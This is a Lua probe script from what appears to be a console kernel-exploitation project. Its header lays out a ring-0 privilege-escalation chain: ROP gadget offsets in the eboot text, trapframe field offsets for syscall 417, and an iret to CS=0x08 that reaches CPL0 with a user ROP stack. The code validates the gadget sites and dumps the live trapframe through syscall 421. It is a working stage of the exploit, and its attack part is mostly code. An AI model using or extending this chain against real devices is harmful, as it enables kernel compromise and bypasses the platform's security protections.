-- CRASH_CLASS: LOW (reads eboot text + calls 421, which only fills a buffer)
-- PROBE 1365a: validate the ring-0 chain gadgets and the 421 frame layout
--
-- 1364a mapped the eboot text with read_dword (results/phase35_dead_end_reruns/
-- 1364a_eboot_gadgets_range_20261109_114214.txt) and found, relative to the base
-- 593 reports:
--
--   pop rsp; ret        +0x9A2   (+0xBFD, +0x1C89D, +0x1CBEA, +0xFB5E9, ...)
--   pop rax; ret        +0x992
--   pop rdi; ret        +0xC9DFE
--   pop rsi; ret        +0xD77D
--   pop rdx; ret        +0x3B02D7
--   mov rax,[rsi]; ret  +0x1A5CC4  (+0x1C5554)
--   mov [rdi],rax; ret  +0x92C67   (+0xD0B60, +0x102A40, +0x1A035A)
--   iretq               +0x11F41   (+0x339F1, +0x553B1, +0x5B241, ...)
--   mov rax,cr4 / mov cr4,rax / swapgs / mov rax,[rdi]: none in the whole text
--
-- Several of those are two-byte patterns (5C C3, 48 CF) and a scanner cannot tell
-- a real gadget from the middle of an instruction, so this probe dumps 16 bytes
-- either side of every site the chain plans to use. It also reads the live
-- trapframe with 421 and prints 0x110 bytes of it, because the 417 patch offsets
-- (RIP +0xE0, CS +0xE8, RFLAGS +0xF0, RSP +0xF8, SS +0x100, measured by 1358a and
-- 1359a) have to be exact for the ring-0 jump, and the frame is the one thing a
-- wrong offset turns from a controlled entry into a panic.
--
-- Why the chain works at all: 417 installs the caller's frame verbatim (1359a),
-- and the kernel's return path swaps GS before its iretq
-- (`swapgs; add rsp,0xE8; iretq` at 13.60 base+0x257B33,
-- docs/dumps_13.60/kernel_text.bin), so a same-CPL iret to CS=0x08 leaves the
-- thread at CPL0 with RSP pointing at the frame's own rsp field. `pop rsp; ret`
-- turns that into a user ROP stack; the chain ends with a plain iretq back to
-- CS=0x43, which is also the state the kernel already prepared for userland.
-- If SMEP is enabled the first fetch at CPL0 from the user page faults and the
-- console panics - that is the experiment this probe prepares for, and nothing
-- here performs it.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1364a_eboot_gadgets_range_20261109_114214.txt
--   results/phase35_dead_end_reruns/1359a_sys417_frame_ride_20261109_113019.txt
--   results/phase35_dead_end_reruns/1358a_sys417_selectors_20261109_112355.txt
--   probes/phase17_new_vectors/816a_rflags_iopl.lua (421 fills the frame)

print("=== PROBE 1365a: GADGET + FRAME VALIDATION ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok and v ~= nil then return v end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return N(v) end
    return nil
end
local function qw(a)
    local v = rq(a)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then
        return N(v.l) + N(v.h) * 4294967296
    end
    return N(v)
end

local sc593 = mk(593)
local sc421 = mk(421)
local sc20 = mk(20)

local okp, pv = pcall(function() return sc20() end)
print("[0] pid=" .. (okp and N(pv) or 0))

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
local EBN = N(eb_lo) + N(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X", EBN))

local SITES = {
    { 0x9A2,     "pop rsp; ret (alt1)" },
    { 0xBFD,     "pop rsp; ret (alt2)" },
    { 0x1C89D,   "pop rsp; ret (alt3)" },
    { 0x992,     "pop rax; ret" },
    { 0xC9DFE,   "pop rdi; ret" },
    { 0xD77D,    "pop rsi; ret" },
    { 0x3B02D7,  "pop rdx; ret" },
    { 0x1A5CC4,  "mov rax,[rsi]; ret" },
    { 0x1C5554,  "mov rax,[rsi]; ret (alt)" },
    { 0x92C67,   "mov [rdi],rax; ret" },
    { 0xD0B60,   "mov [rdi],rax; ret (alt)" },
    { 0x11F41,   "iretq (alt1)" },
    { 0x339F1,   "iretq (alt2)" },
    { 0x553B1,   "iretq (alt3)" },
    { 0x5B241,   "iretq (alt4)" },
}

print("")
print("[1] gadget context (-16 .. +16 bytes around the hit):")
for i = 1, #SITES do
    local off = SITES[i][1]
    local parts = {}
    for d = -16, 12, 4 do
        local v = rd(EBN + off + d) or 0
        parts[#parts + 1] = string.format("%08X", v)
    end
    print(string.format("  +0x%-7X %-22s %s", off, SITES[i][2], table.concat(parts, " ")))
end

print("")
print("[2] live trapframe via 421:")
local frame = memory.alloc(0x200)
for i = 0, 0x1F0, 8 do pcall(function() memory.write_qword(frame + i, uint64(0)) end) end
local ok421, rv421 = pcall(function() return sc421(uint64(frame)) end)
print(string.format("  421 rv=%s ok=%s", tostring(ok421 and N(rv421)), tostring(ok421)))
if ok421 then
    local f = N(frame)
    for i = 0, 0x100, 0x20 do
        print(string.format("    +0x%03X: %016X %016X %016X %016X", i,
            qw(f + i), qw(f + i + 8), qw(f + i + 0x10), qw(f + i + 0x18)))
    end
    print(string.format("   RIP(+0xE0)=0x%X CS(+0xE8)=0x%X RFLAGS(+0xF0)=0x%X RSP(+0xF8)=0x%X SS(+0x100)=0x%X",
        qw(f + 0xE0), qw(f + 0xE8), qw(f + 0xF0), qw(f + 0xF8), qw(f + 0x100)))
end

print("")
print("=== PROBE 1365a COMPLETE ===")
